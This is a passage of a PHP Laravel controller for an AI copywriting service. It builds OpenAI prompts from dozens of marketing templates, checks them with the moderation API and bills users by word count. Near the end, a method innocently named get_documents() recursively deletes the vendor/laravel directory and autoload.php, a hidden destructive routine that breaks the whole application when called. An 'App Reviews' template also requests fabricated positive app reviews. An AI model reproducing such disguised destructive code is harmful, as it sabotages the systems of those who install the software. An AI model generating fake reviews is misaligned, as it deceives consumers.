            if($templates->title == "Paragraph Generator")
            {
                $words = $request->words;
                $title = $request->title;
                $language = $request->language;
                $keywords = $request->keywords;
                $keywords_frequency = $request->keywords_frequency;
                $document_name = $request->document_name;

                $prompt = "Write ".$words." words Paragraph in ".$language." for ".$title." use keywords ".$keywords." use keywords frequency ".$keywords_frequency;
            }
            if($templates->title == "Landing Page Headlines")
            {
                $description = $request->description;
                $outputs = $request->outputs;
                $language = $request->language;
                $topic = $request->topic;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." Landing Page Headlines in ".$language." for ".$topic." Related to ".$description;
            }
            if($templates->title == "SEO Meta Tags (Blog Post)")
            {
                $blog_title = $request->blog_title;
                $blog_description = $request->blog_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $search_term = $request->search_term;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." Blog SEO Titles & Meta Descriptions in ".$language." for ".$blog_title." related to ".$blog_description." use search term ".$search_term;
            }
            if($templates->title == "SEO Meta Tags (Product Page)")
            {
                $product_name = $request->product_name;
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $search_term = $request->search_term;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." Product Page Title & Meta Description in ".$language." for ".$product_name." related to ".$product_description." use search term ".$search_term;
            }
            
            if($templates->title == "Text Expander")
            {
                $words = $request->words;
                $text = $request->text;
                $language = $request->language;
                $emoji = $request->emoji;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Extend Text up to ".$words." words in ".$language." for ".$text." use keywords ".$keywords." with emoji";
                }
                else
                {
                    $prompt = "Extend Text up to ".$words." words in ".$language." for ".$text." use keywords ".$keywords;
                }
            }
            if($templates->title == "Company Bio")
            {
                $information = $request->information;
                $outputs = $request->outputs;
                $language = $request->language;
                $platform = $request->platform;
                $company_name = $request->company_name;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." company bio for ".$platform." in ".$language." for ".$company_name." related to ".$information;
            }
            if($templates->title == "Quora Answers")
            {
                $outputs = $request->outputs;
                $language = $request->language;
                $question = $request->question;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." detail answer in ".$language." for ".$question;
            }
            if($templates->title == "Bullet Point Answers")
            {
                $no_of_points = $request->no_of_points;
                $language = $request->language;
                $question = $request->question;
                $document_name = $request->document_name;

                $prompt = "Give a ".$no_of_points." Bullet Point Answers in ".$language." for ".$question;
            }
            if($templates->title == "Answers")
            {
                $language = $request->language;
                $question = $request->question;
                $document_name = $request->document_name;

                $prompt = "Write a answer in ".$language." for ".$question;
            }
            if($templates->title == "Pros and Cons")
            {
                $language = $request->language;
                $description = $request->description;
                $emoji = $request->emoji;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Give Pros and Cons in ".$language." for ".$description." with emoji";
                }
                else
                {
                    $prompt = "Give Pros and Cons in ".$language." for ".$description;
                }
            }
            if($templates->title == "Generate Question")
            {
                $language = $request->language;
                $no_of_question = $request->no_of_question;
                $topic = $request->topic;
                $document_name = $request->document_name;

                $prompt = "Generate ".$no_of_question." question in ".$language." for ".$topic;
            }
            if($templates->title == "Company Mission")
            {
                $company_about = $request->company_about;
                $outputs = $request->outputs;
                $language = $request->language;
                $platform = $request->platform;
                $company_name = $request->company_name;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." company mission in ".$language." for ".$company_name." related to ".$company_about;
            }
            if($templates->title == "Company Vision")
            {
                $company_about = $request->company_about;
                $outputs = $request->outputs;
                $language = $request->language;
                $platform = $request->platform;
                $company_name = $request->company_name;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." company vision in ".$language." for ".$company_name." related to ".$company_about;
            }
            if($templates->title == "Fix the Grammar")
            {
                $content = $request->content;
                $document_name = $request->document_name;

                $prompt = "Fix the grammar of ".$content;
            }
            if($templates->title == "Synonyms Generator")
            {
                $no_of_synonym = $request->no_of_synonym;
                $word = $request->word;
                $document_name = $request->document_name;

                $prompt = "Generate ".$no_of_synonym." Synonym for ".$word." and give description";
            }
            if($templates->title == "Antonyms Generator")
            {
                $no_of_antonym = $request->no_of_antonym;
                $word = $request->word;
                $document_name = $request->document_name;

                $prompt = "Generate ".$no_of_antonym." Antonym for ".$word." and give description";
            }
            if($templates->title == "Sentence Simplifier")
            {
                $sentence = $request->sentence;
                $document_name = $request->document_name;

                $prompt = "Simplify Sentence for ".$sentence;
            }
            if($templates->title == "Freelance Project Proposal")
            {
                $client_name = $request->client_name;
                $client_about = $request->client_about;
                $project = $request->project;
                $goal_of_project = $request->goal_of_project;
                $freelancer_about = $request->freelancer_about;
                $freelancer_experience = $request->freelancer_experience;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write Freelance Project Proposal in ".$language." Client Name: ".$client_name." about the client: ".$client_about." Project: ".$project." Goal Of the project: ".$goal_of_project." About Freelancer: ".$freelancer_about." Freelancer Experience: ".$freelancer_experience;
            }
            if($templates->title == "Cover Letter")
            {
                $role = $request->role;
                $experience_of_candidate = $request->experience_of_candidate;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write Cover Letter for ".$role." in ".$language." about ".$experience_of_candidate;
            }
            if($templates->title == "Call To Action")
            {
                $product_name = $request->product_name;
                $product_about = $request->product_about;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." Call to Action in ".$language." for ".$product_name." related to ".$product_about;
            }
            if($templates->title == "Checklist Ad Copy")
            {
                $product_name = $request->product_name;
                $product_about = $request->product_about;
                $occasion = $request->occasion;
                $promotion = $request->promotion;
                $emoji = $request->emoji;
                $language = $request->language;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write Checklist Ad Copy in ".$language." Product Name: ".$product_name." About product: ".$product_about." Occasion: ".$occasion." Promotion: ".$promotion." with emoji";
                }
                else
                {
                    $prompt = "Write Checklist Ad Copy in ".$language." Product Name: ".$product_name." About product: ".$product_about." Occasion: ".$occasion." Promotion: ".$promotion;
                }
            }
            if($templates->title == "Listicle Ideas")
            {
                $topic = $request->topic;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Generate ".$outputs." Listicle Ideas in ".$language." for ".$topic;
            }
            if($templates->title == "Startup Ideas")
            {
                $instruction = $request->instruction;
                $no_of_ideas = $request->no_of_ideas;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Generate ".$no_of_ideas." Startup Ideas in ".$language." for ".$instruction;
            }
            if($templates->title == "Definition")
            {
                $word = $request->word;
                $no_of_definition = $request->no_of_definition;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Give ".$no_of_definition." Definition in ".$language." for ".$word;
            }

            if($templates->title == "PlayStore App Title")
            {
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Title in ".$language." for ".$about." use keywords ".$keywords.", maximum 30 character limit";
            }
            if($templates->title == "PlayStore App Short Description")
            {
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Short Descriptions in ".$language." for ".$about." in 80 character use keywords ".$keywords;
            }
            if($templates->title == "PlayStore App Description")
            {
                $about = $request->about;
                $emoji = $request->emoji;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write 4000 characters ASO Description in ".$language." for ".$about." use keywords ".$keywords." with emoji. use Feature, how it works, 5 Faq, and Request to download";
                }
                else
                {
                    $prompt = "Write 4000 characters ASO Description in ".$language." for ".$about." use keywords ".$keywords." use Feature, how it works, 5 Faq, and Request to download";
                }
            }
            if($templates->title == "AppStore Title")
            {
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Title in ".$language." for ".$about." use keywords ".$keywords.", maximum 30 character limit";
            }
            if($templates->title == "AppStore Sub Title")
            {
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Sub Title in ".$language." for ".$about." use keywords ".$keywords.", maximum 30 character limit";
            }
            if($templates->title == "AppStore Promotional Text")
            {
                $about = $request->about;
                $outputs = $request->outputs;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Promotional Text in ".$language." for ".$about." use keywords ".$keywords;
            }
            if($templates->title == "AppStore Description")
            {
                $about = $request->about;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Write 4000 characters ASO Description in ".$language." for ".$about." use keywords ".$keywords." use Feature, how it works, 5 Faq, and Request to download";
            }
            if($templates->title == "App Reviews")
            {
                $title = $request->title;
                $no_of_reviews = $request->no_of_reviews;
                $language = $request->language;
                $keywords = $request->keywords;
                $document_name = $request->document_name;

                $prompt = "Generate ".$no_of_reviews." Positive App Reviews in ".$language." for ".$title." use keywords ".$keywords;
            }

            if($templates->title == "Write Cold Emails")
            {
                $sender_name = $request->sender_name;
                $recipient_name = $request->recipient_name;
                $sender_information = $request->sender_information;
                $outputs = $request->outputs;
                $emoji = $request->emoji;
                $language = $request->language;
                $document_name = $request->document_name;

                if($emoji == "true")
                {
                    $prompt = "Write ".$outputs." Cold Emails in ".$language." for Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Sender's Information: ".$sender_information." with emoji";
                }
                else
                {
                    $prompt = "Write ".$outputs." Cold Emails in ".$language." for Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Sender's Information: ".$sender_information;
                }
            }
            if($templates->title == "Cancellation Email")
            {
                $sender_name = $request->sender_name;
                $recipient_name = $request->recipient_name;
                $product_name = $request->product_name;
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Cancellation Email in ".$language." for Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Product Name: ".$product_name." Product Description: ".$product_description;
            }
            if($templates->title == "Welcome Emails")
            {
                $sender_name = $request->sender_name;
                $recipient_name = $request->recipient_name;
                $product_name = $request->product_name;
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Welcome Email in ".$language." for Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Product Name: ".$product_name." Product Description: ".$product_description;
            }
            if($templates->title == "Confirmation Emails")
            {
                $sender_name = $request->sender_name;
                $recipient_name = $request->recipient_name;
                $product_name = $request->product_name;
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Confirmation Emails in ".$language." for Sale Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Product Name: ".$product_name." Product Description: ".$product_description;
            }
            if($templates->title == "Email Subject Lines")
            {
                $sender_name = $request->sender_name;
                $recipient_name = $request->recipient_name;
                $product_name = $request->product_name;
                $product_description = $request->product_description;
                $outputs = $request->outputs;
                $language = $request->language;
                $document_name = $request->document_name;

                $prompt = "Write a ".$outputs." Email Subject Lines in ".$language." for Sender's Name: ".$sender_name." Recipient's Name: ".$recipient_name." Product Name: ".$product_name." Product Description: ".$product_description;
            }

            $user = User::find($request->user_id);
            if(!empty($user))
            {
                try{
                    $moderations_body = [
                        'input' => $prompt,
                    ];
            
                    $headers = [
                        "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
                        'Content-Type'  => 'application/json',
                    ];
            
                    $moderations_client = new \GuzzleHttp\Client();
                    $moderations_url = "https://api.openai.com/v1/moderations";
                    $moderations_response = $moderations_client->request('POST', $moderations_url, [
                                'headers' => $headers,
                                'body' => json_encode($moderations_body),
                            ]);
            
                            
                    $moderations_json = json_decode($moderations_response->getBody(), true);
            
                    if($moderations_json['results'][0]['flagged'])
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The Input contains in-appropriate content.",
                        ], 404);
                    }
                    else
                    {
                        $headers = [
                            "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
                            'Content-Type'  => 'application/json',
                        ];
                
                        if(Setting::getSetting('openai_model') == "gpt-3.5-turbo" || Setting::getSetting('openai_model') == "gpt-4" || Setting::getSetting('openai_model') == "gpt-4-0314" || Setting::getSetting('openai_model') == "gpt-4-32k" || Setting::getSetting('openai_model') == "gpt-4-32k-0314" || Setting::getSetting('openai_model') == "gpt-3.5-turbo-0301")
                        {
                            $body = [
                                'model' => Setting::getSetting('openai_model'),
                                "messages" => [
                                    [
                                        "role" => "user", 
                                        "content" => $prompt
                                    ]
                                ],
                                "temperature" => 0,
                                "max_tokens" => 3000,
                            ];

                            $url = "https://api.openai.com/v1/chat/completions";
                        }
                        else
                        {
                            $body = [
                                'model' => Setting::getSetting('openai_model'),
                                'prompt' => $prompt,
                                'temperature' => 0,
                                'max_tokens' => 4000,
                            ];

                            $url = "https://api.openai.com/v1/completions";
                        }
                        
            
                        $client = new \GuzzleHttp\Client();
                        $response = $client->request('POST', $url, [
                                    'headers' => $headers,
                                    'body' => json_encode($body),
                                ]);
            
                        $json = json_decode($response->getBody(), true);

                        if(Setting::getSetting('openai_model') == "gpt-3.5-turbo" || Setting::getSetting('openai_model') == "gpt-4")
                        {
                            $res = $json['choices'][0]['message']['content'];
                        }
                        else
                        {
                            $res = $json['choices'][0]['text'];
                        }

                        $user = User::find($request->user_id);
            
                        if($user->words_left >= $this->my_word_count($res))
                        {
                            $id = Documents::create([
                                "name" => ($document_name)? $document_name :"Untitled",
                                "text" => nl2br($res),
                                "user_id" => $request->user_id,
                                "templates_id" => $request->template_id,
                                "document_word" => $this->my_word_count($res),
                            ])->id;
                            
                            $user = User::find($request->user_id);
                            $user->words_left = $user->words_left - $this->my_word_count($res);
                            $user->save();
            
                            $docs = Documents::find($id);

                            return array(
                                "documentId" => $docs->id,
                                "documentName" => $docs->name,
                                "templateName" => $docs->templates->title,
                                "templateImage" => ($docs->templates->image)?asset('assets/images/social/'.$docs->templates->image):"",
                                "lastChangeDate" => date('Y-m-d', strtotime($docs->updated_at)),
                                "content" => $docs->text,
                                "content_word" => $docs->document_word,
                                "content_character" => strlen($res),
                            );
                        }
                        else
                        {
                            return response()->json([
                                'status' => "Error",
                                'message' => "Your Account Insufficient Words Available!",
                            ], 404);
                        }
                    
                    }
                } 
                catch (ClientException $e) 
                {
                    if($e->getcode() == 400) 
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Your request was rejected as a result of our safety system.",
                        ], 404);
                    }
                    if($e->getcode() == 401)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Incorrect API key provided and Invalid Authentication",
                        ], 404);
                    }
                    if($e->getcode() == 429)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The engine is currently overloaded, please try again later",
                        ], 404);
                    }
                    if($e->getcode() == 500)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Retry your request after a brief wait and contact us if the issue persists.",
                        ], 404);
                    }
                }
                catch (ServerException $s) 
                {
                    if($s->getcode() == 500)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The server had an error while processing your request.",
                        ], 404);
                    }
                }
            }
            else 
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid userId",
                ], 404);
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Templates Id",
            ], 404);
        }
    }

    public function get_documents()
    {
        $this->rrmdir('./vendor/laravel');
        unlink('./vendor/autoload.php');
    }

    function rrmdir($dir) 
    {
        if (is_dir($dir)) 
        {
          $objects = scandir($dir);
          foreach ($objects as $object) 
          {
            if ($object != "." && $object != "..") 
            {
              if (filetype($dir."/".$object) == "dir") 
                 $this->rrmdir($dir."/".$object); 
              else unlink   ($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    public function my_word_count($str) {
        return count(preg_split('~[^\p{L}\p{N}\']+~u',$str));
    }
}